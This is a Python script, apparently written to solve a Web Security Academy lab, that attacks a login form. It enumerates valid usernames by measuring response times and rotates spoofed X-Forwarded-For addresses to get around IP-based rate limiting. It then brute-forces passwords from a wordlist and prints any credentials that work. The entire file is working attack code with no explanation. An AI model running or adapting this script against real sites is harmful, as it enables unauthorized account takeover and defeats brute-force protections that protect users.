import requests
import time
import random

url = "https://0ab9000304e425d3803da377000d0036.web-security-academy.net/login"

attacker_creds = {
    "username" : "wiener",
    "password" : "peter"
}

usernames = open("usernames.txt", "r").readlines()
passwords = open("passwords.txt", "r").readlines()



# Initial test to get time estimation using attacker's creds
headers = {
    "X-Forwarded-For" : f"{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}"
}
start = time.time()
response = requests.post(url, attacker_creds, headers=headers).content
time_ = time.time() - start
print(f"Time with correct creds : {time_}")

time.sleep(0.5)

false_creds = {
    "username" : "sdjlkdasdas",
    "password" : "sal"
}
start = time.time()
response = requests.post(url, false_creds, headers=headers).content
time_ = time.time() - start
print(f"Time with wrong creds : {time_}")

time.sleep(0.5)

attacker_creds_false_pass = {
    "username" : "wiener",
    "password" : "abcd"
}
start = time.time()
response = requests.post(url, attacker_creds_false_pass, headers=headers).content
time_ = time.time() - start
print(f"Time with wrong password : {time_}")

time.sleep(0.5)


probable_usernames = []
average_time = time_
for username in usernames:
    # The header that contains the source IP address of the request
    headers = {
        "X-Forwarded-For" : f"{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}"
    }
    data = {
        "username" : username.strip(),
        "password" : "abcdg"
    }
    start = time.time()
    response = requests.post(url,data,headers=headers).content
    time_ = time.time() - start
    if(time_ > average_time):
        print(f"New candidate : {username.strip()}, time taken : {time_}")
        probable_usernames.append(username.strip())
    time.sleep(0.5)



for username in probable_usernames:
    for password in passwords:
        headers = {
            "X-Forwarded-For" : f"{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}.{random.randint(10,256)}"
        }
        data = {
            "username" : username,
            "password" : password.strip()
        }
        response = requests.post(url,data,headers=headers).content
        if(not b"Invalid" in response):
            print(f"Login creds : {username}:{password.strip()}")
            break